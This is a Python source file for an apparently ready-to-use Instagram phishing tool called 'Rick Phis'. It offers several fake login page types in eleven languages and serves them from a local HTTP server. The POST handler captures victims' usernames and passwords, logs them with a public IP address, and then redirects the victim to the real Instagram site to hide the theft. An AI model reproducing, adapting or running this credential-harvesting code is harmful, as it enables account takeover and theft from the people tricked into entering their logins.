from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init
import requests
import socket

init()

red_color = Fore.RED
white_color = Fore.WHITE
yellow_color = Fore.YELLOW

name = """  
  _____  _      _      _____  _     _     
 |  __ \\(_)    | |    |  __ \\| |   (_)    
 | |__) |_  ___| | __ | |__) | |__  _ ___ 
 |  _  /| |/ __| |/ / |  ___/| '_ \\| / __|
 | | \\ \\| | (__|   <  | |    | | | | \\__ \\
 |_|  \\_\\_|\\___|_|\\_\\ |_|    |_| |_|___/"""

accounts = """[1] Normal Login [2] Security Login[3] Change-password Login[4] Verify Login[5] Get-Followers Login[6] CLD Tools          
        """
print(red_color + name)
print(Fore.WHITE + "\n                     by https://github.com/Rickidevs\n")
parts = accounts.split('[')
for part in parts:
    if part.startswith('1] Normal'):
        print(f'{red_color}[{white_color}1{red_color}] {yellow_color} Normal ', end='')
    elif part.startswith('2] Security'):
        print(f'          {red_color}[{white_color}2{red_color}] {yellow_color} Security ', end='')
    elif part.startswith('3] Change'):
        print(f'\n{red_color}[{white_color}3{red_color}] {yellow_color} Change-password ', end='')
    elif part.startswith('4] Verify'):
        print(f' {red_color}[{white_color}4{red_color}] {yellow_color} Verify ', end='')
    elif part.startswith('5] Get'):
        print(f'    \n{red_color}[{white_color}5{red_color}] {yellow_color} Get-Followers ', end='')
    elif part.startswith('6] CLD'):
        print(f'   {red_color}[{white_color}6{red_color}] {yellow_color} CLD Tools', end='\n',)
    else:
        print(part, end='')

print(Fore.BLUE)
try:
    chosen = int(input("Choice: "))
except ValueError:
    print(Fore.RED + "Invalid input. Please enter a number.")
    exit()
print(Fore.GREEN)

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        file_path = self.path.strip('/')
        if file_path == '':
            file_path = web_site

        try:
            if file_path.endswith('.css'):
                with open(file_path, 'rb') as file:
                    content = file.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/css')
                    self.end_headers()
                    self.wfile.write(content)
            else:
                with open(file_path, 'rb') as file:
                    content = file.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, f'File Not Found: {self.path}')
        except Exception as e:
            self.send_error(500, f'Server Error: {e}')

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            post_data = post_data.split('&')
            data_dict = {}
            for item in post_data:
                key, value = item.split('=')
                data_dict[key] = value

            public_ip = self.get_public_ip()
            
            print(Fore.RED, "Username:", data_dict['username'])
            print(Fore.RED, "Password:", data_dict['password'])
            print(Fore.RED, "Address:", public_ip, Fore.RESET)

            self.send_response(302)
            self.send_header('Location', 'http://www.instagram.com')
            self.end_headers()
        except Exception as e:
            self.send_error(500, f'Failed to process POST request: {e}')

    def get_public_ip(self):
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            return response.json()['ip']
        except Exception as e:
            print("Failed to obtain public IP address:", e)
            return None

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('google.com', 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print("Failed to obtain IP address:", e)
        ip_address = None
    finally:
        s.close()
    return ip_address

def find_empty_port(start_port=8000, end_port=65535):
    for port in range(start_port, end_port + 1):
        if is_port_in_use(port):
            print(f"{port} Port is in use, checking the next port...")
        else:
            return port
    print("No free ports were found in the specified range.")
    return None

def is_port_in_use(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', port))
        s.close()
        return False
    except OSError:
        return True

host = get_ip_address()
c_port = find_empty_port()

if chosen == 1:
    print(Fore.RESET,"""            
1. Arabic       4. English    7. Italian    10. Spanish
2. Azerbaijani  5. French     8. Korean     11. Turkish
3. Chinese      6. German     9. Russian""")

print(Fore.BLUE)
try:
    lang = int(input("Choice: "))
except ValueError:
    print(Fore.RED + "Invalid input. Please enter a number.")
    exit()
print(Fore.GREEN)

if lang ==  1:
    web_site = "htmls\\ar.html"
elif lang == 2:
    web_site = "htmls\\az.html"
elif lang == 3:
    web_site = "htmls\\ch.html"
elif lang == 4:
    web_site = "htmls\\index.html"
elif lang == 5:
    web_site = "htmls\\fr.html"
elif lang == 6:
    web_site = "htmls\\de.html"
elif lang == 7:
    web_site = "htmls\\it.html"
elif lang == 8:
    web_site = "htmls\\ko.html"
elif lang == 9:
    web_site = "htmls\\ru.html"
elif lang == 10:
    web_site = "htmls\\es.html"
elif lang == 11:
    web_site = "htmls\\tr.html"

if c_port:
    print(f"Server IP Address: {host}")
    print(f"Selected port: {c_port}\n")

    try:
        server = HTTPServer((host, c_port), MyHTTPRequestHandler)
        print(f"Server is started on: http://{host}:{c_port}/\n", Fore.RESET)
        server.serve_forever()
    except Exception as e:
        print(Fore.RED, f"Failed to start server: {e}")
else:
    print(Fore.RED,"No free port found.")
